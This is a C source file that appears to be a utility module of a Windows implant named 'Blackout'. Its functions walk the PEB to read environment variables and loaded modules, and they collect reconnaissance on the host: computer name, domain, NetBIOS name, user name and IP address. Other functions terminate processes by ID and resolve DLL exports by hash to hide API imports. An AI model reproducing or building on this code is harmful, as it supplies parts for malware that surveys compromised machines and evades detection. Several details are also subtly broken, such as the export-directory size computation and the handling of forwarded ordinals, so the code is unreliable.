#include <Common.h>
#include <Constexpr.h>

typedef HMODULE (*fnLoadLibraryA)( LPCSTR );

FUNC PWSTR GetEnvVar( 
    _In_ PWSTR EnvVar 
) {
    BLACKOUT_INSTANCE

    PWSTR EnvTmp = Instance()->Teb->ProcessEnvironmentBlock->ProcessParameters->Environment;

    while (1)
	{
		int j = StringLengthW( EnvTmp );

		if ( !j ) {
			EnvTmp = NULL;
			break;
		}

		if (*(ULONG_PTR*)EnvTmp == *(ULONG_PTR*)EnvVar)
			break;
            
		EnvTmp = EnvTmp + ( j * sizeof(WCHAR) ) + sizeof(WCHAR);
	}

	if ( EnvTmp ) {
		int j = StringLengthW( EnvTmp ) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ( (WCHAR)EnvTmp[i] == (WCHAR)L'=' )
				return (PWSTR)&EnvTmp[i + sizeof(WCHAR)];
		}
	}
	
	return NULL;
}

FUNC VOID GetComputerInfo(
    _Out_ WORD  *ProcessArch,
    _Out_ DWORD *ProcessType,
    _Out_ DWORD *ProductType, 
    _Out_ PSTR  *IpAddress
) {
    BLACKOUT_INSTANCE

    DWORD ReturnProductTp = 0;
    DWORD UserTmpLen = MAX_PATH;
    DWORD CompTmpLen = 0;
    DWORD DomainLen  = 0;
    DWORD NetBiosLen = 0;
    DWORD Length     = 0;
    BOOL  bCheck     = 0;

    SYSTEM_INFO SysInf = { 0 };

    Instance()->Win32.GetNativeSystemInfo( &SysInf );

    bCheck = Instance()->Win32.GetProductInfo( 
        Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMinorVersion, &ReturnProductTp 
    );

    if( !bCheck )
        PackageTransmitError( NtLastError() );

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
        Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
    }

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
        Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
    }

    if ( !Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
        Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
    }

    ULONG AdapterInfoSize = 0;
    PIP_ADAPTER_INFO Adapters = NULL;

    if ( Instance()->Win32.GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
        Adapters = bkHeapAlloc( AdapterInfoSize );
        if (Adapters) {
            Instance()->Win32.GetAdaptersInfo( Adapters, &AdapterInfoSize );
        }
    }

    Instance()->Win32.GetUserNameA( Instance()->System.UserName, &UserTmpLen );
    
    *ProcessArch  = SysInf.wProcessorArchitecture;
    *ProcessType  = SysInf.dwProcessorType;
    *ProductType  = ReturnProductTp;
    *IpAddress    = (Adapters && Adapters->IpAddressList.IpAddress.String[0]) ? Adapters->IpAddressList.IpAddress.String : NULL;

LeaveFunc:
    if ( Adapters ) 
        bkHeapFree( Adapters, Length );

    return;
}

FUNC VOID GetProcessInfo(
	_Out_     PWSTR *FullPath,
	_Out_     PWSTR *BaseName,
	_Out_     PWSTR *CmdLine
) {
	BLACKOUT_INSTANCE

	PPEB                  Peb   = { 0 };
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

	Peb   = NtCurrentTeb()->ProcessEnvironmentBlock;
    Head  = &Peb->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

	Data = C_PTR( Entry );

	*FullPath = Data->FullDllName.Buffer;
	*BaseName = Data->BaseDllName.Buffer;
	*CmdLine  = Peb->ProcessParameters->CommandLine.Buffer;

	return;    
}

FUNC BOOL KillProcess(
	_In_ DWORD ProcessId
) {
	BLACKOUT_INSTANCE

	HANDLE hProcess = NULL; 
	BOOL   bSuccess = FALSE;

	hProcess = bkOpenProcess( PROCESS_TERMINATE, FALSE, ProcessId );
	
	if ( !hProcess )
		return FALSE;

	bSuccess = bkTerminateProcess( hProcess, 0x01 );

	bkCloseHandle( hProcess );
	
	return bSuccess;
}

FUNC PVOID LdrModuleAddr(
    _In_ ULONG Hash
) {
	BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = C_PTR( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

FUNC PVOID LdrFuncAddr( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
) {
    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew );
    pImgExportDir   = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = C_PTR( BaseModule + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = C_PTR( BaseModule + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = C_PTR( BaseModule + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = (PCHAR)( BaseModule + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( BaseModule + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncName ) {
            if (( U_PTR( pFunctionAddress ) >= U_PTR( pImgExportDir ) ) &&
                ( U_PTR( pFunctionAddress )  < U_PTR( pImgExportDir ) + ExpDirSz )) {

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                MmCopy( ForwarderName, pFunctionAddress, StringLengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < StringLengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                fnLoadLibraryA pLoadLibraryA = LdrFuncAddr(LdrModuleAddr(H_MODULE_KERNEL32), HASH_STR( "LoadLibraryA" ) );

                HMODULE hForwardedModule = pLoadLibraryA(FuncMod);
                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        int ordinal = (INT)( nwFuncName + 1 );
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( (LPCSTR)ordinal ) );
                    } else {
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( nwFuncName ) );
                    }
                }
                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}